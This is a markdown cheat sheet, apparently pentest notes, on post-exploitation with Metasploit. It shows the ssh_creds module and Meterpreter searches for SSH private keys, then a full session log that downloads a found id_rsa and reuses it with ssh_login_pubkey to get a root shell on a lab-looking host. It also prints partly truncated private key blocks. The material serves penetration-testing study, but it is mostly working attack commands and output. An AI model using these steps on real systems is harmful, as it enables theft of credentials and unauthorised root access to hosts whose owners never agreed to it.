# Metasploit

## 01 - Enumerate

### 1.1 - Metasploit Post Module

```
msf > use post/multi/gather/ssh_creds

msf post(ssh_creds) > options

Module options (post/multi/gather/ssh_creds):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf post(ssh_creds) > run session=<session_ID>
```

### 1.2 - Meterpreter API Command

```
meterpreter > search -d /path/to/directory/ -f authorized_keys -f id_rsa -f id_dsa
```

## 02 - Scenarios

### 2.1 - Reuse Credentials

```
meterpreter > search -d / -f authorized_keys
No files matching your search were found.
meterpreter > search -d / -f id_rsa
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
/backups/supersecretkeys/id_rsa  2590          2020-06-17 23:20:44 -0400

meterpreter > download /backups/supersecretkeys/id_rsa /home/user/.ssh/id_rsa
[*] Downloading: /backups/supersecretkeys/id_rsa -> /home/user/.ssh/id_rsa
[*] Downloaded 2.53 KiB of 2.53 KiB (100.0%): /backups/supersecretkeys/id_rsa -> /home/user/.ssh/id_rsa
[*] download   : /backups/supersecretkeys/id_rsa -> /home/user/.ssh/id_rsa
meterpreter > bg
[*] Backgrounding session 1...
msf6 post(multi/gather/ssh_creds) > use auxiliary/scanner/ssh/ssh_login_pubkey
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > options

Module options (auxiliary/scanner/ssh/ssh_login_pubkey):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   KEY_PASS                           no        Passphrase for SSH private key(s)
   KEY_PATH                           no        Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub
                                                " will be skipped. Duplicate private keys will be ignored.
   PRIVATE_KEY                        no        The string value of the private key that will be used. If you are using MSFConsole, this value shou
                                                ld be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set private_key file:/home/user/.ssh/id_rsa
private_key => -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzSWvqfxeIpTuFmdAFyWDQho0h8ud3g9zSJ32pjosNcTQJe3/kYC4
B5hMlfIXzH5oKn9YRn55O10RYxppZpXFsc4H7pYquD5TLKLmaH7UqBj9X1WjGeZLexx+f2
kPAcxLkXaPNq0q5kjXyygRi34LvOn/wdpux7T3pGYsG1HmFrb6LVkBIB9B10LtJGv1q6vl
..[truncated]..
pOLQNytsDeZNlKoCUZHvj7cHKFzkdDAAAAwQDXGF2W/3zgltz4G362qpBL4lEo3UHpxp52
+IaZ4FX2yKA42rggJW7XSwZvtPIErIRDFxgNW/3Rv/pyzEqFK5+jG606XpeufxfvdD/PWw
nwXur7vpiut49V2ig0UjaQxyjQjNjb29XH2/yhDjLOetTf5ZRhyafnImUzvZ28NArJfdBy
i2bE6UXt34y9lY+X0nG7V2rfQFBf4kbV/4Kz0uMyUXN2SvEzcxO+4WGILSQFj+x9MsY0YE
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----

msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts 10.10.140.168
rhosts => 10.10.140.168
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set username root
username => root
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > exploit

[*] 10.10.140.168:22 SSH - Testing Cleartext Keys
[*] 10.10.140.168:22 - Testing 1 key from PRIVATE_KEY
[+] 10.10.140.168:22 - Success: 'root:-----BEGIN RSA PRIVATE KEY-----
MIIG5AIBAAKCAYEAzSWvqfxeIpTuFmdAFyWDQho0h8ud3g9zSJ32pjosNcTQJe3/
kYC4B5hMlfIXzH5oKn9YRn55O10RYxppZpXFsc4H7pYquD5TLKLmaH7UqBj9X1Wj
..[truncated]..
reT9n/DDIuzTxKEX7xhn5f8kT3G5P+GSPFmiSFmh9Dh1/SAIYLPfDIdpSobyrfO8
fMbv0kcEKV8y/X8Ut/n74z0EtRWEERCZuA8+JPLN7P82UP7Cbohjxg==
-----END RSA PRIVATE KEY-----
' 'uid=0(root) gid=0(root) groups=0(root) Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux '
[*] SSH session 2 opened (10.8.145.108:37683 -> 10.10.140.168:22) at 2022-05-23 17:44:13 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---
## References

- [Rapid7: Metasploit Framework Auxiliary Scanner SSH Login Pubkey](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login_pubkey.md)